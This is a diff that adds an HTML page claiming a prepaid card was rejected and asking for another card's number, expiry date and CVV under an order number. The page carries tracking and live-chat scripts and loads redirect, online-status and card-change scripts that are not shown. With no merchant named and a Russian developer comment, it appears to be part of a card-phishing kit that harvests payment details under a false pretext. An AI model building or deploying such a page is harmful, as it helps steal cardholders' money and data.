@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/static/images/favicon.png" />
+    <title>Prepaid Card Not Supported</title>
+    <link rel="stylesheet" href="/static/css/card.css?v2" />
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js"
+      );
+      fbq("init", "1151045393054747");
+      fbq("track", "PageView");
+    </script>
+    <noscript
+      ><img
+        height="1"
+        width="1"
+        style="display: none"
+        src="https://www.facebook.com/tr?id=1151045393054747&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+    <!-- Smartsupp Live Chat script -->
+    <script type="text/javascript">
+      var _smartsupp = _smartsupp || {};
+      _smartsupp.key = "efdc468a819ade11dea03565c203c6e8163e428b";
+      window.smartsupp ||
+        (function (d) {
+          var s,
+            c,
+            o = (smartsupp = function () {
+              o._.push(arguments);
+            });
+          o._ = [];
+          s = d.getElementsByTagName("script")[0];
+          c = d.createElement("script");
+          c.type = "text/javascript";
+          c.charset = "utf-8";
+          c.async = true;
+          c.src = "https://www.smartsuppchat.com/loader.js?";
+          s.parentNode.insertBefore(c, s);
+        })(document);
+    </script>
+    <noscript>
+      Powered by
+      <a href="https://www.smartsupp.com" target="_blank"
+        >Smartsupp</a
+      ></noscript
+    >
+  </head>
+  <body>
+    <div class="container">
+      <div class="left-section">
+        <h1>Prepaid Card</h1>
+        <div class="subtitle">Not Supported</div>
+
+        <div class="illustration">
+          <svg viewBox="0 0 220 180" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <linearGradient
+                id="prepaid-grad"
+                x1="0%"
+                y1="0%"
+                x2="100%"
+                y2="100%"
+              >
+                <stop
+                  offset="0%"
+                  style="stop-color: #ffa726; stop-opacity: 1"
+                />
+                <stop
+                  offset="100%"
+                  style="stop-color: #ff9800; stop-opacity: 1"
+                />
+              </linearGradient>
+            </defs>
+
+            <!-- Prepaid card with warning -->
+            <rect
+              x="60"
+              y="60"
+              width="100"
+              height="60"
+              rx="8"
+              fill="url(#prepaid-grad)"
+            />
+            <rect
+              x="70"
+              y="70"
+              width="80"
+              height="40"
+              rx="4"
+              fill="#4d6aff"
+              opacity="0.9"
+            />
+            <rect x="80" y="80" width="60" height="20" rx="2" fill="white" />
+
+            <!-- "PREPAID" text on card -->
+            <text
+              x="110"
+              y="105"
+              font-size="8"
+              font-weight="bold"
+              fill="white"
+              text-anchor="middle"
+              opacity="0.8"
+            >
+              PREPAID
+            </text>
+
+            <!-- Warning symbol -->
+            <circle cx="170" cy="100" r="15" fill="#ffa726" />
+            <path
+              d="M170 88 L170 98 M170 102 L170 103"
+              stroke="white"
+              stroke-width="2"
+              stroke-linecap="round"
+            />
+
+            <!-- Prohibition symbol -->
+            <circle
+              cx="170"
+              cy="100"
+              r="12"
+              stroke="white"
+              stroke-width="2"
+              fill="none"
+            />
+            <path
+              d="M164 94 L176 106"
+              stroke="white"
+              stroke-width="2"
+              stroke-linecap="round"
+            />
+          </svg>
+        </div>
+
+        <p class="description">
+          We currently do not accept prepaid cards for this transaction. Please
+          use a credit or debit card to complete your payment.
+        </p>
+      </div>
+
+      <div class="right-section">
+        <div class="payment-card">
+          <div class="card-header">
+            <div class="status-icon warning">
+              <svg
+                width="32"
+                height="32"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="white"
+                stroke-width="2.5"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              >
+                <path
+                  d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"
+                ></path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+              </svg>
+            </div>
+            <div class="payment-info">
+              <div class="payment-status">
+                We do not accept PREPAID cards as payment. Please enter another
+                card.
+              </div>
+            </div>
+          </div>
+
+          <div class="order-info">
+            <span class="order-label">Order No.</span>
+            <span class="order-number" id="orderNumber">
+              770727642081439744c514
+              <svg
+                class="copy-icon"
+                width="16"
+                height="16"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+              >
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                <path
+                  d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                ></path>
+              </svg>
+            </span>
+          </div>
+
+          <div class="form-container">
+            <div class="payment-method warning">
+              <svg
+                class="method-icon"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+              >
+                <path
+                  d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"
+                ></path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+              </svg>
+              <span>Prepaid Card Detected</span>
+            </div>
+
+            <div class="warning-alert">
+              <svg
+                width="20"
+                height="20"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+              >
+                <path
+                  d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"
+                ></path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+              </svg>
+              <span
+                >We currently do not support prepaid cards. Please use a credit
+                or debit card to proceed with your payment.</span
+              >
+            </div>
+
+            <form id="change-card-form">
+              <div class="form-group">
+                <label class="form-label">Alternative Card Number</label>
+                <input
+                  type="text"
+                  class="form-input"
+                  placeholder="1234 1234 1234 1234"
+                  id="cardNumber"
+                  inputmode="numeric"
+                  maxlength="19"
+                  autofocus
+                />
+              </div>
+
+              <div class="form-row">
+                <div class="form-group">
+                  <label class="form-label">Expiry Date</label>
+                  <input
+                    type="text"
+                    class="form-input"
+                    placeholder="MM/YY"
+                    id="expiry"
+                    inputmode="numeric"
+                    maxlength="5"
+                  />
+                </div>
+
+                <div class="form-group">
+                  <label class="form-label">CVV</label>
+                  <input
+                    type="text"
+                    class="form-input"
+                    placeholder="123"
+                    id="cvv"
+                    inputmode="numeric"
+                    maxlength="4"
+                  />
+                </div>
+              </div>
+
+              <button type="submit" class="pay-button" id="submit-btn">
+                <svg
+                  width="18"
+                  height="18"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2.5"
+                  stroke-linecap="round"
+                >
+                  <path
+                    d="M12 1v22M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"
+                  ></path>
+                </svg>
+                Use Different Card
+              </button>
+
+              <div class="loading" id="loading" style="display: none">
+                <svg
+                  width="18"
+                  height="18"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2.5"
+                >
+                  <circle cx="12" cy="12" r="10"></circle>
+                </svg>
+                Processing...
+              </div>
+            </form>
+
+            <div class="security-notice">
+              <svg
+                width="16"
+                height="16"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+              >
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+              </svg>
+              <span
+                >Credit and debit cards are accepted. Prepaid cards are not
+                supported at this time.</span
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Подключаем скрипты -->
+    <script src="/static/js/redirect.js?v2"></script>
+    <script src="/static/js/online-status.js?v2"></script>
+    <script src="/static/js/change-card.js?v2"></script>
+  </body>
+</html>
